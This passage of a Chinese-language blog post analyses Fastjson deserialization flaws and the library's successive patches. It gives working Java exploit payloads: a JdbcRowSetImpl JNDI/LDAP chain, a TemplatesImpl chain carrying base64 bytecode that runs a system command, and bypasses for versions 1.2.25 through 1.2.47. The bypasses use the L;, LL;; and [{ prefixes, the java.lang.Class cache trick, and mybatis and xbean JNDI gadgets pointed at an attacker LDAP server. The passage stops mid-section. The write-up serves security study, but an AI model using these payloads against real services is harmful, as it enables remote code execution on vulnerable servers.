<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">demo1</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(aa, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">//        System.out.println(json);</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">aa1</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>成功触发</p>
<p><img src="https://luokuang1.github.io/images/fastjson15.png" width="95%" height="80%"></p>
<p>调用流程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connect:<span class="number">627</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:<span class="number">4067</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">setValue:<span class="number">96</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:<span class="number">922</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1293</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">137</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">128</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">10</span>, Fastjson_Jdbc_LDAP</span><br></pre></td></tr></table></figure>
<h4 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h4><p>TemplatesImpl类在cc链里面就有用到，主要的利用方法就是通过它的defineClass方法来实现动态类加载，而想让它调用到defineClass方法就需要从getOutputProperties方法入手</p>
<p>静态的去看吧，在getOutputProperties方法里面调用了newTransformer方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在newTransformer里面又调用了getTransletInstance方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getTransletInstance方法里面又继续调用了defineTransletClasses方法最后到达defineClass</p>
<p><img src="https://luokuang1.github.io/images/fastjson16.png" width="95%" height="80%"></p>
<p>下面来分析一下需要满足的条件首先在getTransletInstance方法里面需要满足 _name!=null,_class=null</p>
<p>下面在newTransformer里面的if判断里面需要保证_tfactory有值，像cc链里面一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里还有一个小问题，我们传入的_bytecodes为bytes类型，而Fastjson在解析的时候会将bytes类型进行base64加密，解密的过程相反。所以这里我们需要将恶意类的字节码base64加密</p>
<p>最后来构造payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/fastjson17.png" width="95%" height="80%"></p>
<h3 id="Fastjson高版本绕过"><a href="#Fastjson高版本绕过" class="headerlink" title="Fastjson高版本绕过"></a>Fastjson高版本绕过</h3><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a><strong>补丁分析</strong></h4><h5 id="1-2-25-1-2-41补丁"><a href="#1-2-25-1-2-41补丁" class="headerlink" title="1.2.25-1.2.41补丁"></a>1.2.25-1.2.41补丁</h5><p>这里主要看到创建对象时的代码逻辑进行了什么修改</p>
<p><img src="https://luokuang1.github.io/images/fastjson18.png" width="95%" height="80%"></p>
<p>和以前的进行对比一下，这里多加了一个checkAutoType方法这里不再是直接类加载了</p>
<p><img src="https://luokuang1.github.io/images/fastjson19.png" width="95%" height="80%"></p>
<p>单独看看checkAutoType方法里面是如何waf的</p>
<p>首先里面就是一个if，if里面的内容就是老版本的代码逻辑，if判断里面有两个属性，一个为autoTypeSupport默认为false，expectClass也是默认传入的为null，所以这里就有两个路走一个为autoTypeSupport为true或者false，autoTypeSupport代表白名单，我们可以手动设置为true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/fastjson20.png" width="95%" height="80%"></p>
<p>但是如果直接手动改为true也没有办法加载到恶意类，这里可以跟进去看看，里面是否修改了什么</p>
<p><img src="https://luokuang1.github.io/images/fastjson21.png" width="95%" height="80%"></p>
<p>这里主要看TypeUtils的loadClass方法</p>
<p><img src="https://luokuang1.github.io/images/fastjson22.png" width="95%" height="80%"></p>
<p>这里首先去掉 [ ]再判断是否满足类名开头为L，结尾为;  满足就去掉首尾再继续类加载，对于去掉 [ ]是因为在进入for之前它会判断一次长度，即默认只有数组才可以走到这里</p>
<p><img src="https://luokuang1.github.io/images/fastjson23.png" width="95%" height="80%"></p>
<p>下一个for里面主要是过滤黑名单</p>
<p><img src="https://luokuang1.github.io/images/fastjson24.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/fastjson25.png" width="95%" height="80%"></p>
<h5 id="1-2-42补丁"><a href="#1-2-42补丁" class="headerlink" title="1.2.42补丁"></a><strong>1.2.42补丁</strong></h5><p>这里主要对上面进行了补充</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">黑名单改为了hash值，防止绕过;</span><br><span class="line"></span><br><span class="line">对于传入的类名，删除开头L和结尾的;</span><br></pre></td></tr></table></figure>
<p>还是看checkAutoType方法里面又添加了什么东西，前面还是没有什么变化</p>
<p><img src="https://luokuang1.github.io/images/fastjson26.png" width="95%" height="80%"></p>
<p>后面就开始添加一些规则，如果满足if条件就去掉第一个字符和最后一个字符,再继续进行下一步</p>
<p><img src="https://luokuang1.github.io/images/fastjson27.png" width="95%" height="80%"></p>
<p>下一步就是进行运算，这里应该就是通过运算来判断其是否为黑名单</p>
<p><img src="https://luokuang1.github.io/images/fastjson28.png" width="95%" height="80%"></p>
<h5 id="1-2-43补丁"><a href="#1-2-43补丁" class="headerlink" title="1.2.43补丁"></a><strong>1.2.43补丁</strong></h5><p>这里就在上面的版本里面又去除了前面两个字符为LL的情况</p>
<p>ParseConfig的checkAutoType方法里面除了前面两个字符为LL的情况</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-47补丁"><a href="#1-2-47补丁" class="headerlink" title="1.2.47补丁"></a>1.2.47补丁</h5><p>在1.2.47的版本里面可以通过引入了一个mapping缓存,从而实现任意类加载，这个方法并不是1.2.47版本才有，是针对ParserConfig的checkAutoType方法都有，主要绕过通过将恶意类先写入mapping缓存中从而绕过异常的抛出</p>
<p><img src="https://luokuang1.github.io/images/fastjson29.png" width="95%" height="80%"></p>
<h5 id="1-2-48补丁"><a href="#1-2-48补丁" class="headerlink" title="1.2.48补丁"></a>1.2.48补丁</h5><p>并将java.lang.Class类放入了黑名单，这样彻底封死了从mapping中加载恶意类</p>
<p>由于上面进行分析，在开启AutoType和未开启是两个不同的代码逻辑，所以这里需要分别考虑</p>
<p><strong>设置AutoType</strong> 默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
<ul>
<li>JVM启动参数：-Dfastjson.parser.autoTypeSupport=true</li>
<li>代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true);</li>
</ul>
<p>之后的payload 有些需要开启AutoType</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="低于1-2-47版本的补丁通杀绕过"><a href="#低于1-2-47版本的补丁通杀绕过" class="headerlink" title="低于1.2.47版本的补丁通杀绕过"></a><strong>低于1.2.47版本的补丁通杀绕过</strong></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.2</span><span class="number">.25</span>-<span class="number">1.2</span><span class="number">.32</span>版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</span><br><span class="line"><span class="number">1.2</span><span class="number">.33</span>-<span class="number">1.2</span><span class="number">.47</span>版本：无论是否开启AutoTypeSupport，都能成功利用；</span><br></pre></td></tr></table></figure>
<p>这里通过JdbcRowSetImpl+ldap来进行举例，其它也是差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">                <span class="string">&quot;  \&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;AutoCommit\&quot;:false\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的绕过方法是通过先通过白名单java.lang.Class，这里会获取到MiscCodec类，再调用deserialze方法，里面会对一个参数val的赋值操作，最后再通再TypeUtils.loadClass来进行类加载</p>
<p>调用的流程分析</p>
<p>这里先走到DefaultJSONParser的parseObject方法，到方法的最后面调用了deserialize方法，这里的deserializer属性为MiscCodec类，所以下一步就会进入到MiscCodec的deserialze方法进行分析</p>
<p><img src="https://luokuang1.github.io/images/fastjson30.png" width="95%" height="80%"></p>
<p>这里先判断键是否为val,然后就赋值给odjVal属性</p>
<p><img src="https://luokuang1.github.io/images/fastjson31.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/fastjson32.png" width="95%" height="80%"></p>
<p>最后odjVal属性赋值给strVal</p>
<p><img src="https://luokuang1.github.io/images/fastjson33.png" width="95%" height="80%"></p>
<p>最后走到TypeUtils.loadClass来进行类加载strVal属性</p>
<p><img src="https://luokuang1.github.io/images/fastjson34.png" width="95%" height="80%"></p>
<h5 id="1-2-25-1-2-41补丁绕过"><a href="#1-2-25-1-2-41补丁绕过" class="headerlink" title="1.2.25-1.2.41补丁绕过"></a>1.2.25-1.2.41补丁绕过</h5><p>这个绕过是基于autoTypeSupport为true的情况下白名单绕过，通过多加一个L和;绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String aaa= <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;, &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;autoCommit\&quot;:true&quot;</span></span><br><span class="line">                        +<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-42补丁绕过"><a href="#1-2-42补丁绕过" class="headerlink" title="1.2.42补丁绕过"></a><strong>1.2.42补丁绕过</strong></h5><p>这个绕过是基于autoTypeSupport为true的情况下白名单绕过，通过多加一个LL和;;绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String aaa= <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;, &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;autoCommit\&quot;:true&quot;</span></span><br><span class="line">                        +<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-43补丁绕过"><a href="#1-2-43补丁绕过" class="headerlink" title="1.2.43补丁绕过"></a><strong>1.2.43补丁绕过</strong></h5><p>可以通过[{绕过，Payload如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String aaa= <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;, &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;\&quot;autoCommit\&quot;:true&quot;</span></span><br><span class="line">                        +<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-45补丁绕过"><a href="#1-2-45补丁绕过" class="headerlink" title="1.2.45补丁绕过"></a>1.2.45补丁绕过</h5><p>1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">3.5</span><span class="number">.6</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">    config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String aaa=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;properties\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-62-1-2-68版本"><a href="#1-2-62-1-2-68版本" class="headerlink" title="1.2.62-1.2.68版本"></a><strong>1.2.62-1.2.68版本</strong></h5><p><strong>1.2.62</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">需要开启AutoType；</span><br><span class="line">JNDI注入利用所受的JDK版本限制；</span><br><span class="line">目标服务端需要存在xbean-reflect包</span><br></pre></td></tr></table></figure>
<p>所需要的依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String aaa=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里主要看JndiConverter如何触发jndi</p>
<p>在JndiConverter的toObjectImpl方法里面有lookup，接下来就是看哪里调用了这个方法</p>
<p><img src="https://luokuang1.github.io/images/fastjson35.png" width="95%" height="80%"></p>
<p>在它的父类AbstractConverter的setAsText方法里面的toObject方法里面调用了</p>
<p><img src="https://luokuang1.github.io/images/fastjson36.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/fastjson37.png" width="95%" height="80%"></p>
<p>所以只需要上传AsText属性就可以调用该方法，所以最后的payload就可以有了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        config.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String aaa=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/test\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(aaa, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>1.2.66</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">开启AutoType；</span><br><span class="line">JNDI注入利用所受的JDK版本限制；</span><br><span class="line">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</span><br><span class="line">org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖</span><br></pre></td></tr></table></figure>
<p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类Poc：</p>
